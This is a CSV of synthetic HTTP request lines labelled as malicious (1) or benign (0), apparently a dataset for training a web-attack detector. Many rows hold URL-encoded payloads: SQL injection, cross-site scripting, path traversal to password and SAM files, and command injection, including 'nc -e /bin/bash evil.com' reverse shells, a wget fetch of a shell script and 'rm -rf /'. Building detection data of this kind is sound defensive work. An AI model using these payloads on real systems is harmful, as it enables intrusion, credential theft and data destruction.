text,label
OPTIONS /api/orders?region=I%20%27%20AND%20extractvalue%281%2Cconcat%280x7e%2Cversion%28%29%29%29--%20order&view=234 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /profile?comment=I%20%3Csvg%20onload%3Dalert%281%29%3E%20email%40example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /help/faq order_id=I+would+like+to+order&product_id=best+regards&filters=../../../etc/passwd User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/products age=my+address+is&content=../../../etc/passwd&color=123+Main+St&search=549 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /api/products?rating=this%20%27%3B%20SELECT%20pg_sleep%285%29--%20you&filters=contact+me+at+email@example.com&category=787 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /js/app.js age=John+Doe&author=692&tags=960 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
OPTIONS /about?id=67&view=117&age=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /css/style.css city=hello+world&search_term=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&date=123+Main+St&filter=this+is+a+normal+comment&new_password=385 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /users/456?search=I+would+like+to+order&comment=%26%20nc%20-e%20/bin/bash%20evil.com%204444&old_password=691&lang=my+address+is&limit=test+user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /api/users?search=best+regards&q=admin%20%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29--%20St User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /posts/789 id=test+user&name=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E&sort=676 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /contact?category=John+Doe&view=848&session=114&order_id=989&filters=394 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
GET /help/faq?city=378&first_name=test+user&type=884 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /contact price_max=test%20%26%20nc%20-e%20/bin/bash%20evil.com%204444%20request&session=admin+access+request&first_name=762&view=706 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /docs/api?title=123+Main+St&session=%3B%20wget%20http%3A//evil.com/shell.sh User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
OPTIONS /css/style.css?password=contact%20..%25252f..%25252f..%25252fetc%25252fpasswd%20regards&q=123+Main+St&filter=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /api/v2/analytics?username=this+is+a+normal+comment&new_password=%27%20AND%201%3D1--&price_max=my+address+is&content=453&status=John+Doe User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /api/orders?action=best+regards&region=%24%28cat%20/etc/shadow%29&order=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /dashboard lang=John+Doe&tracking=54&first_name=please+find+attached&action=contact+me+at+email@example.com&order_id=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
DELETE /api/v1/data?user_id=%27%20UNION%20SELECT%20NULL%2CNULL%2CNULL--&columns=242&old_password=654 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /api/reports sort=system+log+entry&password=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /dashboard category=523&token=123+Main+St&price_max=system+log+entry&password=test%20file%3A///etc/passwd%20user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/orders format=system+log+entry&order=101&lang=test%20%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--%20you&product_id=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /about comment=452&price_min=62 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /api/reports?limit=339&view=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
OPTIONS /contact?filter=please+find+attached&region=686&age=I+would+like+to+order&tag=962&author=please+find+attached User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /api/products?city=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&type=704&tracking=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /profile quantity=171&email=1%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /api/v1/data phone=please%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20request User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /api/orders?tags=thank%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20is&filters=please+find+attached&columns=system+log+entry&phone=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /about old_password=688&lang=please+find+attached&first_name=176&title=I+would+like+to+order&q=499 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /register tracking=207&price_max=system%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20is User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /posts/789 product_id=%7C%20cat%20/etc/passwd&status=610&quantity=486 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /login order_id=587&tracking=I%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /images/logo.png?columns=..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam&new_password=contact+me+at+email@example.com&lang=109 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /profile page=test+user&comment=my%20..%5C..%5C..%5Cwindows%5Csystem32%5Cconfig%5Csam%20comment&rating=600&name=this+is+a+normal+comment&id=my+address+is User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /products/123?new_password=thank%20%27%20AND%201%3D2--%20you&color=my+address+is&order=325&phone=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /dashboard?order_id=thank+you&id=I%20%3B%20wget%20http%3A//evil.com/shell.sh%20you User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /js/app.js price_min=793&author=best+regards&order_id=694&rating=423 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /users/456?lang=hello+world&region=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /api/reports?price_min=hello+world&tag=167&date=hello+world&format=123+Main+St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /products/123?page=48 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
GET /api/search?search_term=%27%3B%20DROP%20TABLE%20users--&tracking=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /users/456?category=289&filter=I%20%27%3B%20WAITFOR%20DELAY%20%2700%3A00%3A05%27--%20you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /dashboard email=773 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
OPTIONS /profile?price_min=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
HEAD /api/v1/data?filters=best+regards&last_name=contact%20%3Cscript%20src%3D%27http%3A//evil.com/xss.js%27%3E%3C/script%3E%20Doe&id=905 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
POST /css/style.css password=please+find+attached&type=hello%20%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd%20request User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /images/logo.png?name=38&city=496&filter=%26%20%24%28which%20bash%29%20-c%20%27ls%27&new_password=admin+access+request User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /settings region=%3Csvg%20onload%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /dashboard?q=this%20%27%20OR%20%271%27%3D%271%27--%20user&search_term=272&first_name=test+user User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /api/search region=660&order=system+log+entry User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PATCH /docs/api type=contact+me+at+email@example.com&category=contact%20%3B/bin/c%3F%3F%20/etc/p%3F%3F%3F%3Fd%20attached&last_name=I+would+like+to+order User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /register?sort=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /about price_max=123+Main+St&category=best+regards&first_name=system+log+entry&columns=240&last_name=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /help/faq?page=%3B%20%24%28printf%20%27%5Cx6c%5Cx73%27%29&price_max=805&name=thank+you&quantity=thank+you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/search?search_term=admin+access+request&tracking=this+is+a+normal+comment&title=test+user&age=597 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
HEAD /contact?title=contact%20%26%20%24%28which%20bash%29%20-c%20%27ls%27%20is&old_password=this+is+a+normal+comment&region=798 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/reports?content=test%20admin%27%20OR%20%271%27%3D%271%20entry&token=324 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /posts/789 search_term=please+find+attached User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PATCH /contact region=449&date=503&action=%3Bcat%24%7BIFS%7D/etc/passwd User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /api/users type=%27%20AND%201%3D1-- User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /images/logo.png name=thank+you&filters=test+user&order=1%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--&status=system+log+entry&username=224 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
DELETE /register?city=%3B%20rm%20-rf%20/ User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /images/logo.png?columns=%3B%20rm%20-rf%20/&first_name=123+Main+St&filter=554&user_id=802 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PATCH /users/456 id=95&filters=test+user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /api/v1/data?sort=I%201%27%20UNION%20ALL%20SELECT%20username%2Cpassword%2Cemail%20FROM%20users--%20user&session=603 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /api/v2/analytics status=thank+you&content=admin%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20regards&quantity=951&password=system+log+entry&token=test+user User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /contact?author=this+is+a+normal+comment&email=157 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /login order=John%20..%25252f..%25252f..%25252fetc%25252fpasswd%20comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /css/style.css?filters=I+would+like+to+order&new_password=John+Doe&phone=846&order_id=test%20%26%20nc%20-e%20/bin/bash%20evil.com%204444%20email%40example.com User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /js/app.js?tracking=%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--&quantity=admin+access+request&view=744&action=this+is+a+normal+comment&city=865 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /contact session=admin+access+request&view=test+user&quantity=hello%20%27%20OR%20%271%27%3D%271%27--%20comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /js/app.js status=system%201%27%20UNION%20SELECT%20table_name%20FROM%20information_schema.tables--%20comment&tags=admin+access+request User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /api/v1/data?price_max=42&title=file%3A///etc/passwd&comment=796 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /api/v2/analytics color=please+find+attached&region=123+Main+St&username=thank+you&last_name=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
GET /images/logo.png?date=contact+me+at+email@example.com&search_term=746&password=725&filters=893 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
HEAD /api/reports?lang=my+address+is&tags=best+regards&limit=my+address+is&content=123+Main+St&sort=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
POST /js/app.js date=%27%20AND%20%27x%27%3D%27x&rating=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /products/123?price_max=123%20%3Csvg/onload%3Dalert%281%29%3E%20user&title=1&old_password=359&tags=123+Main+St&user_id=test+user User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /contact category=554&limit=hello+world User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /about?comment=please%20%7Cc%27a%27t%20/etc/passwd%20St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
HEAD /dashboard?comment=thank+you&date=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E&color=637&region=system+log+entry&price_max=thank+you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/products?city=contact+me+at+email@example.com&q=I%20%3Bcat%24%7BIFS%7D/etc/passwd%20entry&tags=595 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /images/logo.png?age=best+regards&name=241&format=this+is+a+normal+comment&old_password=please+find+attached User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /products/123?title=%26%20whoami&city=I+would+like+to+order&q=my+address+is&search=391 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /images/logo.png?order=%26%20%24%28which%20bash%29%20-c%20%27ls%27 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
HEAD /api/users?password=%3Csvg%20onload%3Dalert%281%29%3E&price_min=95 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /api/reports?columns=....//....//....//etc/passwd User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /users/456?tracking=503&limit=system%20%27%20OR%20%271%27%3D%271%27--%20regards User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
GET /products/123?price_max=best%20%60id%60%20you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /help/faq q=best+regards&status=John+Doe User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
POST /api/v1/data quantity=hello+world&session=%24%28cat%20/etc/shadow%29&user_id=John+Doe User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /api/products?rating=hello+world&order_id=123+Main+St&type=459&tags=admin%27-- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
PUT /js/app.js old_password=my+address+is&type=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&order=440&lang=best+regards User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /images/logo.png?id=best%20admin%27/%2A%20comment&title=605 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
GET /settings?product_id=admin%20%7Cawk%20%27%7Bprint%20%241%7D%27%20/etc/passwd%20St User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PATCH /css/style.css type=%27%20AND%20SLEEP%285%29-- User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /images/logo.png view=thank+you&city=665 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
POST /api/v2/analytics city=%3Csvg%20onload%3Dalert%281%29%3E User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /login?first_name=John+Doe&tags=system+log+entry&page=I%20%27%20AND%20SLEEP%285%29--%20comment User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PATCH /api/products price_max=111&type=667&format=361&order=%27%20AND%201%3DCONVERT%28int%2C%28SELECT%20%40%40version%29%29-- User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /images/logo.png?q=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&action=753&search=please+find+attached&limit=897&date=John+Doe User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
OPTIONS /api/v2/analytics?session=this+is+a+normal+comment&action=best%201%27%20AND%20SUBSTRING%28%40%40version%2C1%2C1%29%3D%275%27--%20you User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /help/faq?filter=60&category=please+find+attached&token=I%20%27%20AND%20%27x%27%3D%27x%20entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
PATCH /images/logo.png color=%3Cbody%20onload%3Dalert%28document.domain%29%3E User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
POST /contact format=267&content=8&q=I%20%27%20AND%20%27x%27%3D%27x%20request User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
PUT /profile action=637 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
PUT /api/products search_term=886&category=511 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /docs/api?name=418&filters=best+regards User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
GET /js/app.js?comment=my%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20comment User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
OPTIONS /settings?content=%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E&order_id=123+Main+St User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /posts/789?region=780&token=143&name=906&status=John%20..%25252f..%25252f..%25252fetc%25252fpasswd%20email%40example.com&page=86 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
PUT /login price_max=admin%20../../../etc/passwd%20you User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
DELETE /help/faq?tags=373&product_id=93&order_id=244 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
GET /posts/789?last_name=please%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20order User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
HEAD /register?title=best%20admin%27%23%20regards&email=10&color=163 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /dashboard rating=test+user&color=please%20%27%20OR%201%3D1--%20world&content=hello+world User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
OPTIONS /api/v2/analytics?token=best%20%27%20AND%20%27x%27%3D%27x%20entry User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /register?old_password=admin%20%3Ciframe%20src%3D%27javascript%3Aalert%281%29%27%3E%20Doe&limit=542&age=my+address+is&new_password=system+log+entry User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
DELETE /dashboard?limit=this+is+a+normal+comment&price_min=admin+access+request&tag=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /register new_password=....%5C%5C....%5C%5C....%5C%5Cwindows%5C%5Csystem32&view=940&color=system+log+entry&type=please+find+attached User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
DELETE /api/orders?phone=607 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
OPTIONS /docs/api?type=%27%20AND%20%27x%27%3D%27y&email=system+log+entry User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
DELETE /about?tracking=%3Cscript%3Ealert%28document.cookie%29%3C/script%3E&price_min=admin+access+request&price_max=690 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
POST /login category=%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E&date=this+is+a+normal+comment&order=747&old_password=contact+me+at+email@example.com&page=309 User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /images/logo.png?username=503 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PATCH /register old_password=171 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /css/style.css?price_min=John%20%3Cimg%20src%3Dx%20onerror%3Deval%28atob%28%27YWxlcnQoMSk%3D%27%29%29%3E%20email%40example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
GET /posts/789?page=this+is+a+normal+comment User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /products/123 author=123+Main+St&format=hello+world&old_password=379&last_name=957&phone=test+user User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
DELETE /profile?status=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd&username=hello+world&search=241&order=537&filter=best+regards User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,1
HEAD /posts/789?format=please+find+attached&search=891&search_term=936&content=323&first_name=system+log+entry User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /api/v1/data price_min=394&last_name=thank+you&sort=my+address+is User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
DELETE /docs/api?first_name=my+address+is&old_password=%3Cscr%3Cscript%3Eipt%3Ealert%281%29%3C/scr%3C/script%3Eipt%3E User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
HEAD /products/123?order_id=390&session=%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
PUT /login user_id=%27%3B%20SELECT%20pg_sleep%285%29--&columns=thank+you User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,1
POST /dashboard age=hello+world&new_password=28&token=268&view=366 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36,0
POST /api/products format=566&last_name=847 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
PUT /api/v2/analytics city=650&name=hello+world&id=292 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,0
GET /docs/api?username=205&old_password=426&quantity=please+find+attached&email=system+log+entry&new_password=my+address+is User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
PUT /api/products first_name=best+regards&token=318&columns=admin%20%27%3B%20DELETE%20FROM%20products%20WHERE%201%3D1--%20world&date=my+address+is&name=801 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),1
GET /profile?id=please+find+attached&tag=John+Doe&tags=18 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /api/search?search=my%20file%3A///etc/passwd%20order&tags=39&author=thank+you User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),1
OPTIONS /images/logo.png?format=324&order=hello+world&password=thank+you&color=admin+access+request&q=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (iPad; CPU OS 14_0 like Mac OS X),0
DELETE /api/v1/data?id=346&format=thank+you&status=40&quantity=this+is+a+normal+comment&rating=727 User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X),0
GET /api/products?q=123+Main+St&comment=303 User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36,0
OPTIONS /login?category=best+regards&new_password=%27%20AND%201%3D1--&name=974&first_name=I+would+like+to+order&rating=contact+me+at+email@example.com User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36,1
